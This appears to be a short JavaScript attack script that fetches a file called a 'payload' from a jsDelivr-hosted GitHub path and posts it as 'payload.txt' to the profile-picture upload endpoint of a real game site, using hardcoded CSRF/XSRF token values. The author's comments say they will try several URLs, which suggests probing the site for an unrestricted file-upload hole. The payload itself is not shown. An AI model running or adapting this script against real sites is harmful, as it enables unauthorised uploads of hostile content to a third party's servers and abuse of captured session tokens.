const TargetUrl = 'https://apibeta.deeeep.io/users/uploadpic';
// I'm gonna try multiple URL's but I think this one is the best

const PayloadUrl = 'https://cdn.jsdelivr.net/gh/garsfaad0dnimym/wabshur_decreative/file.txt';
// Just a lil test



const token = 'TOKEN';

const headers = {
'X-XSRF-Token':'f0a60f33f3d8e491ce1d68ae2b9919bc',
'CSRF-Token':'f0a60f33f3d8e491ce1d68ae2b9919bc',
};

fetch(PayloadUrl)
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.statusText}`);
    }
    return response.blob();
  })
  .then(blob => {
const formData = new FormData();
formData.append('file', blob, 'payload.txt');


return fetch(TargetUrl, {
  method: 'POST',
  body: formData,
headers: headers,
});
})
.then(response => response.json())
.then(data => {
  console.log('Server response:', data);
})
.catch(error => {
  console.error('Error:', error);
});

